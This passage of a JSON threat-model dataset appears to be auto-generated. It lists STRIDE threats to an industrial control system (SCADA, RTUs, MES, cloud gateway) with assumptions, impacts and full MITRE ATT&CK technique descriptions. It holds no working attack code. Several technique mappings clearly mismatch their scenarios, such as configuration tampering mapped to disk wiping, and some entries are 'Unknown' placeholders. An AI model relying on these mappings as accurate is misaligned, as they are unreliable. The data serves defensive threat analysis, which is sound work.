installers; it's all broken!)",
                "id": "attack-pattern--101c3a64-9ba5-46c9-b573-5c501053cbca",
                "technique_id": "T1514"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "A user on the network gains unauthorized access to higher-level controls in the Control Center.",
            "Assumptions": [
                {
                    "Assumption": "Insufficient access control policies",
                    "Role": "Security Architect",
                    "Condition": "Access controls are weak or misconfigured."
                },
                {
                    "Assumption": "Lack of network segmentation",
                    "Role": "Network Engineer",
                    "Condition": "Network lacks proper segmentation."
                }
            ],
            "Potential Impact": "Unauthorized access to critical control functions, risking major operational impacts.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "control center",
                "access control",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker leverages default credentials on field devices to escalate privileges.",
            "Assumptions": [
                {
                    "Assumption": "Field devices are deployed with default credentials",
                    "Role": "Field Engineer",
                    "Condition": "Default credentials are not changed."
                },
                {
                    "Assumption": "Lack of enforcement of strong password policies",
                    "Role": "Security Engineer",
                    "Condition": "Weak or no password policies."
                }
            ],
            "Potential Impact": "Control over field devices, leading to potential sabotage or data theft.",
            "MITRE ATT&CK Keywords": [
                "elevation of privilege",
                "field devices",
                "credentials",
                "default passwords"
            ],
            "mitre_technique": {
                "name": "Password Guessing",
                "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\n\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies. (Citation: Cylance Cleaver)\n\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\n\n* SSH (22/TCP)\n* Telnet (23/TCP)\n* FTP (21/TCP)\n* NetBIOS / SMB / Samba (139/TCP & 445/TCP)\n* LDAP (389/TCP)\n* Kerberos (88/TCP)\n* RDP / Terminal Services (3389/TCP)\n* HTTP/HTTP Management Services (80/TCP & 443/TCP)\n* MSSQL (1433/TCP)\n* Oracle (1521/TCP)\n* MySQL (3306/TCP)\n* VNC (5900/TCP)\n* SNMP (161/UDP and 162/TCP/UDP)\n\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.(Citation: US-CERT TA18-068A 2018). Further, adversaries may abuse network device interfaces (such as `wlanAPI`) to brute force accessible wifi-router(s) via wireless authentication protocols.(Citation: Trend Micro Emotet 2020)\n\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.",
                "id": "attack-pattern--09c4c11e-4fa1-4f8c-8dad-3cf8e69ad119",
                "technique_id": "T1110.001"
            }
        }
    ]
},
{
    "case_number": "4",
    "batch_number": "27",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker gains unauthorized access to the Control Center by using stolen credentials to impersonate a legitimate user.",
            "Assumptions": [
                {
                    "Assumption": "Credentials are not sufficiently protected",
                    "Role": "System Administrator",
                    "Condition": "Weak password policies"
                },
                {
                    "Assumption": "Multi-factor authentication is not implemented",
                    "Role": "Security Architect",
                    "Condition": "Single-factor authentication"
                },
                {
                    "Assumption": "The monitoring system does not quickly detect unauthorized access",
                    "Role": "SOC Analyst",
                    "Condition": "Inefficient real-time monitoring"
                }
            ],
            "Potential Impact": "Unauthorized access to control commands and sensitive operational data.",
            "MITRE ATT&CK Keywords": [
                "credential access",
                "impersonation",
                "access token manipulation",
                "network"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker masquerades as a field device to send false data to the gateway.",
            "Assumptions": [
                {
                    "Assumption": "Field device authentication mechanisms are weak",
                    "Role": "Device Manufacturer",
                    "Condition": "Inadequate authentication protocols"
                },
                {
                    "Assumption": "Monitoring system does not have anomaly detection for data patterns",
                    "Role": "Security Engineer",
                    "Condition": "Lack of anomaly detection"
                },
                {
                    "Assumption": "Field devices are not segmented from other network zones",
                    "Role": "Network Architect",
                    "Condition": "Flat network architecture"
                }
            ],
            "Potential Impact": "Corruption of data used for analytics and decision making.",
            "MITRE ATT&CK Keywords": [
                "identity spoofing",
                "data manipulation",
                "device impersonation",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker mimics a legitimate cloud service to intercept data being transmitted to and from the gateway.",
            "Assumptions": [
                {
                    "Assumption": "Lack of Mutual TLS",
                    "Role": "System Admin",
                    "Condition": "No mutual authentication"
                },
                {
                    "Assumption": "Gateway does not verify the integrity of cloud services",
                    "Role": "System Architect",
                    "Condition": "Trusting remote entities without verification"
                },
                {
                    "Assumption": "Cloud service URLs are hardcoded and not validated",
                    "Role": "Developer",
                    "Condition": "Static configuration without runtime validation"
                }
            ],
            "Potential Impact": "Unauthorized data interception and potential data leaks.",
            "MITRE ATT&CK Keywords": [
                "cloud service spoofing",
                "man-in-the-middle",
                "eavesdropping",
                "communication channels"
            ],
            "mitre_technique": {
                "name": "Manipulation of Control",
                "description": "Adversaries may manipulate physical process control within the industrial environment. Methods of manipulating control can include changes to set point values, tags, or other parameters. Adversaries may manipulate control systems devices or possibly leverage their own, to communicate with and command physical control processes. The duration of manipulation may be temporary or longer sustained, depending on operator detection.   \n\nMethods of Manipulation of Control include: \n\n* Man-in-the-middle  \n* Spoof command message \n* Changing setpoints  \n\nA Polish student used a remote controller device to interface with the Lodz city tram system in Poland. (Citation: John Bill May 2017) (Citation: Shelley Smith February 2008) (Citation: Bruce Schneier January 2008) Using this remote, the student was able to capture and replay legitimate tram signals. As a consequence, four trams were derailed and twelve people injured due to resulting emergency stops. (Citation: Shelley Smith February 2008) The track controlling commands issued may have also resulted in tram collisions, a further risk to those on board and nearby the areas of impact. (Citation: Bruce Schneier January 2008)",
                "id": "attack-pattern--1af9e3fd-2bcc-414d-adbd-fe3b95c02ca1",
                "technique_id": "T0831"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "A malicious actor tampers with the configuration files of the RTUs to disrupt data processing.",
            "Assumptions": [
                {
                    "Assumption": "Configuration files are accessible without encryption",
                    "Role": "System Admin",
                    "Condition": "Unencrypted file storage"
                },
                {
                    "Assumption": "Insufficient access control mechanisms for RTUs",
                    "Role": "Security Engineer",
                    "Condition": "Weak access control"
                },
                {
                    "Assumption": "RTUs not routinely checked for integrity",
                    "Role": "Maintenance Personnel",
                    "Condition": "Lack of periodic integrity checks"
                }
            ],
            "Potential Impact": "Disruption of data collection and processing from field devices.",
            "MITRE ATT&CK Keywords": [
                "configuration manipulation",
                "data tampering",
                "system disruption",
                "device"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies the control commands being sent from the Control Center to the field devices.",
            "Assumptions": [
                {
                    "Assumption": "Control commands are not encrypted",
                    "Role": "System Architect",
                    "Condition": "Unencrypted control traffic"
                },
                {
                    "Assumption": "Communication channels are not secured against tampering",
                    "Role": "Network Engineer",
                    "Condition": "Insecure communication protocols"
                },
                {
                    "Assumption": "Field devices lack verification for commands received",
                    "Role": "Device Manufacturer",
                    "Condition": "No command integrity checks"
                }
            ],
            "Potential Impact": "Execution of unauthorized actions on industrial processes.",
            "MITRE ATT&CK Keywords": [
                "command manipulation",
                "control tampering",
                "industrial control systems",
                "communication channels"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker alters sensor data being transmitted to SCADA to mislead operators.",
            "Assumptions": [
                {
                    "Assumption": "Sensor data is not authenticated",
                    "Role": "System Engineer",
                    "Condition": "Transmit data without authentication"
                },
                {
                    "Assumption": "Insufficient surveillance for data anomalies",
                    "Role": "SOC Analyst",
                    "Condition": "No anomaly detection systems"
                },
                {
                    "Assumption": "Unsecured communication pathways from sensors to SCADA",
                    "Role": "Network Admin",
                    "Condition": "Insecure communication pathways"
                }
            ],
            "Potential Impact": "Incorrect decision making due to false data.",
            "MITRE ATT&CK Keywords": [
                "sensor tampering",
                "data falsification",
                "sensor data",
                "communication channels"
            ],
            "mitre_technique": {
                "name": "Content Injection",
                "description": "Adversaries may gain access and continuously communicate with victims by injecting malicious content into systems through online network traffic. Rather than luring victims to malicious payloads hosted on a compromised website (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004) followed by [Drive-by Compromise](https://attack.mitre.org/techniques/T1189)), adversaries may initially access victims through compromised data-transfer channels where they can manipulate traffic and/or inject their own content. These compromised online network channels may also be used to deliver additional payloads (i.e., [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)) and other data to already compromised systems.(Citation: ESET MoustachedBouncer)\n\nAdversaries may inject content to victim systems in various ways, including:\n\n* From the middle, where the adversary is in-between legitimate online client-server communications (**Note:** this is similar but distinct from [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557), which describes AiTM activity solely within an enterprise environment) (Citation: Kaspersky Encyclopedia MiTM)\n* From the side, where malicious content is injected and races to the client as a fake response to requests of a legitimate online server (Citation: Kaspersky ManOnTheSide)\n\nContent injection is often the result of compromised upstream communication channels, for example at the level of an internet service provider (ISP) as is the case with \"lawful interception.\"(Citation: Kaspersky ManOnTheSide)(Citation: ESET MoustachedBouncer)(Citation: EFF China GitHub Attack)",
                "id": "attack-pattern--43c9bc06-715b-42db-972f-52d25c09a20c",
                "technique_id": "T1659"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies sending a critical control command in the MES.",
            "Assumptions": [
                {
                    "Assumption": "Lack of proper logging for command execution",
                    "Role": "System Admin",
                    "Condition": "No comprehensive logging"
                },
                {
                    "Assumption": "No digital signatures on critical commands",
                    "Role": "System Architect",
                    "Condition": "Lack of digital signatures"
                },
                {
                    "Assumption": "Weak or incomplete audit trail mechanisms",
                    "Role": "Security Engineer",
                    "Condition": "Inadequate auditing"
                }
            ],
            "Potential Impact": "Disputed actions leading to operational conflicts.",
            "MITRE ATT&CK Keywords": [
                "action repudiation",
                "log tampering",
                "audit trail",
                "user actions"
            ],
            "mitre_technique": {
                "name": "Indicator Removal",
                "description": "Adversaries may delete or modify artifacts generated within systems to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary\u2019s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.\n\nRemoval of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.",
                "id": "attack-pattern--799ace7f-e227-4411-baa0-8868704f2a69",
                "technique_id": "T1070"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An operator denies altering the MES database.",
            "Assumptions": [
                {
                    "Assumption": "Database transactions are not logged",
                    "Role": "Database Admin",
                    "Condition": "No transaction logging"
                },
                {
                    "Assumption": "Access control mechanisms are weak",
                    "Role": "System Admin",
                    "Condition": "Weak access control policies"
                },
                {
                    "Assumption": "Inconsistent application of updates for auditing systems",
                    "Role": "IT Staff",
                    "Condition": "Outdated auditing systems"
                }
            ],
            "Potential Impact": "Disputed data integrity causing operational delays.",
            "MITRE ATT&CK Keywords": [
                "database repudiation",
                "transaction logging",
                "database access",
                "action repudiation"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A cloud service provider denies unauthorized modifications done within the cloud environment.",
            "Assumptions": [
                {
                    "Assumption": "No immutable logs in the cloud environment",
                    "Role": "Cloud Architect",
                    "Condition": "Lack of immutable logging"
                },
                {
                    "Assumption": "Service provider doesn't offer traceable audit logs",
                    "Role": "Cloud Vendor",
                    "Condition": "Non-transparent logging mechanisms"
                },
                {
                    "Assumption": "No contractual obligation for thorough logging",
                    "Role": "Legal Team",
                    "Condition": "Lack of contractual requirements"
                }
            ],
            "Potential Impact": "Inability to track unauthorized changes leading to security breaches.",
            "MITRE ATT&CK Keywords": [
                "cloud service repudiation",
                "audit logs",
                "unauthorized modifications",
                "logging mechanisms"
            ],
            "mitre_technique": {
                "name": "Unknown",
                "description": "No description available",
                "id": "attack-pattern--00000000-0000-0000-0000-000000000000",
                "technique_id": "N/A"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Sensitive operational data is intercepted during transmission to the cloud.",
            "Assumptions": [
                {
                    "Assumption": "Data is transmitted without encryption",
                    "Role": "System Architect",
                    "Condition": "Plaintext transmission"
                },
                {
                    "Assumption": "No secure transport protocols",
                    "Role": "Network Engineer",
                    "Condition": "Lack of secure transport"
                },
                {
                    "Assumption": "Weak perimeter defenses",
                    "Role": "IT Security",
                    "Condition": "Insufficient network defense"
                }
            ],
            "Potential Impact": "Unauthorized disclosure of sensitive operational data.",
            "MITRE ATT&CK Keywords": [
                "data interception",
                "eavesdropping",
                "data in transit",
                "communication channels"
            ],
            "mitre_technique": {
                "name": "Network Sniffing",
                "description": "Adversaries may passively sniff network traffic to capture information about an environment, including authentication material passed over the network. Network sniffing refers to using the network interface on a system to monitor or capture information sent over a wired or wireless connection. An adversary may place a network interface into promiscuous mode to passively access data in transit over the network, or use span ports to capture a larger amount of data.\n\nData captured via this technique may include user credentials, especially those sent over an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such as [LLMNR/NBT-NS Poisoning and SMB Relay](https://attack.mitre.org/techniques/T1557/001), can also be used to capture credentials to websites, proxies, and internal systems by redirecting traffic to an adversary.\n\nNetwork sniffing may reveal configuration details, such as running services, version numbers, and other network characteristics (e.g. IP addresses, hostnames, VLAN IDs) necessary for subsequent [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and/or [Defense Evasion](https://attack.mitre.org/tactics/TA0005) activities. Adversaries may likely also utilize network sniffing during [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) (AiTM) to passively gain additional knowledge about the environment.\n\nIn cloud-based environments, adversaries may still be able to use traffic mirroring services to sniff network traffic from virtual machines. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP) Often, much of this traffic will be in cleartext due to the use of TLS termination at the load balancer level to reduce the strain of encrypting and decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)(Citation: SpecterOps AWS Traffic Mirroring) The adversary can then use exfiltration techniques such as Transfer Data to Cloud Account in order to access the sniffed traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring)\n\nOn network devices, adversaries may perform network captures using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `monitor capture`.(Citation: US-CERT-TA18-106A)(Citation: capture_embedded_packet_on_software)",
                "id": "attack-pattern--3257eb21-f9a7-4430-8de1-d8b6e288f529",
                "technique_id": "T1040"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "An attacker gains access to sensitive data stored in the MES database.",
            "Assumptions": [
                {
                    "Assumption": "Weak database access controls",
                    "Role": "Database Admin",
                    "Condition": "Inadequate access permissions"
                },
                {
                    "Assumption": "Sensitive data is not properly encrypted at rest",
                    "Role": "Data Protection Officer",
                    "Condition": "Unencrypted data storage"
                },
                {
                    "Assumption": "Compromised credentials are not detected promptly",
                    "Role": "SOC Analyst",
                    "Condition": "Delayed threat detection"
                }
            ],
            "Potential Impact": "Exposure of sensitive operational data.",
            "MITRE ATT&CK Keywords": [
                "database access",
                "data at rest",
                "information theft",
                "data exposure"
            ],
            "mitre_technique": {
                "name": "Stored Data Manipulation",
                "description": "Adversaries may insert, delete, or manipulate data at rest in order to manipulate external outcomes or hide activity.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) By manipulating stored data, adversaries may attempt to affect a business process, organizational understanding, and decision making. \n\nStored data could include a variety of file formats, such as Office files, databases, stored emails, and custom file formats. The type of modification and the impact it will have depends on the type of data as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.",
                "id": "attack-pattern--0bf78622-e8d2-41da-a857-731472d61a92",
                "technique_id": "T1492"
            }
        },
        {
            "Threat Type": "Information Disclosure",
            "Scenario": "Cloud service misconfiguration leads to unauthorized data disclosure.",
            "Assumptions": [
                {
                    "Assumption": "Incorrect security settings in cloud services",
                    "Role": "Cloud Admin",
                    "Condition": "Misconfigured access controls"
                },
                {
                    "Assumption": "Lack of periodic security audits",
                    "Role": "Security Auditor",
                    "Condition": "Irregular security assessments"
                },
                {
                    "Assumption": "No monitoring for cloud configuration changes",
                    "Role": "SOC Analyst",
                    "Condition": "No change monitoring"
                }
            ],
            "Potential Impact": "Unauthorized access to cloud-stored data.",
            "MITRE ATT&CK Keywords": [
                "cloud misconfiguration",
                "data exposure",
                "configuration management",
                "data access"
            ],
            "mitre_technique": {
                "name": "Software Deployment Tools",
                "description": "Adversaries may gain access to and use centralized software suites installed within an enterprise to execute commands and move laterally through the network. Configuration management and software deployment applications may be used in an enterprise network or cloud environment for routine administration purposes. These systems may also be integrated into CI/CD pipelines. Examples of such solutions include: SCCM, HBSS, Altiris, AWS Systems Manager, Microsoft Intune, Azure Arc, and GCP Deployment Manager.  \n\nAccess to network-wide or enterprise-wide endpoint management software may enable an adversary to achieve remote code execution on all connected systems. The access may be used to laterally move to other systems, gather information, or cause a specific effect, such as wiping the hard drives on all endpoints.\n\nSaaS-based configuration management services may allow for broad [Cloud Administration Command](https://attack.mitre.org/techniques/T1651) on cloud-hosted instances, as well as the execution of arbitrary commands on on-premises endpoints. For example, Microsoft Configuration Manager allows Global or Intune Administrators to run scripts as SYSTEM on on-premises devices joined to Azure AD.(Citation: SpecterOps Lateral Movement from Azure to On-Prem AD 2020) Such services may also utilize [Web Protocols](https://attack.mitre.org/techniques/T1071/001) to communicate back to adversary owned infrastructure.(Citation: Mitiga Security Advisory: SSM Agent as Remote Access Trojan)\n\nNetwork infrastructure devices may also have configuration management tools that can be similarly abused by adversaries.(Citation: Fortinet Zero-Day and Custom Malware Used by Suspected Chinese Actor in Espionage Operation)\n\nThe permissions required for this action vary by system configuration; local credentials may be sufficient with direct access to the third-party system, or specific domain credentials may be required. However, the system may require an administrative account to log in or to access specific functionality.",
                "id": "attack-pattern--92a78814-b191-47ca-909c-1ccfe3777414",
                "technique_id": "T1072"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "A Distributed Denial of Service (DDoS) attack overwhelms the control center\u2019s network, disrupting communication with RTUs.",
            "Assumptions": [
                {
                    "Assumption": "Lack of DDoS protection mechanisms",
                    "Role": "Network Security Engineer",
                    "Condition": "No DDoS mitigation services"
                },
                {
                    "Assumption": "Insufficient bandwidth to handle traffic spikes",
                    "Role": "IT Infrastructure Manager",
                    "Condition": "Limited network capacity"
                },
                {
                    "Assumption": "Inadequate monitoring of network traffic",
                    "Role": "SOC Analyst",
                    "Condition": "Lack of real-time traffic analysis"
                }
            ],
            "Potential Impact": "Disruption of communication and control over industrial processes.",
            "MITRE ATT&CK Keywords": [
                "DDoS attack",
                "network disruption",
                "service unavailability",
                "network traffic"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Denial of Service",
            "Scenario": "Malware infects field devices causing them to become unresponsive.",
            "Assumptions": [
                {
                    "Assumption": "No antivirus or anti-malware software on field devices",
                    "Role": "IT Security",
                    "Condition": "Unprotected devices"
                },
                {
                    "Assumption": "Field devices are not segmented from the main network",
                    "Role": "Network Admin",
                    "Condition": "Flat network architecture"
                },
                {
                    "Assumption": "No backup systems for critical field devices",
                    "Role": "Operational Manager",
                    "Condition": "Lack of redundancy"
                }
            ],
            "Potential Impact": "Loss of control and monitoring of industrial processes.",
            "MITRE ATT&CK Keywords": [
                "malware infection",
                "device unavailability",
                "system disruption",
                "field devices"
            ],
            "mitre_technique": {
                "name": "Module Firmware",
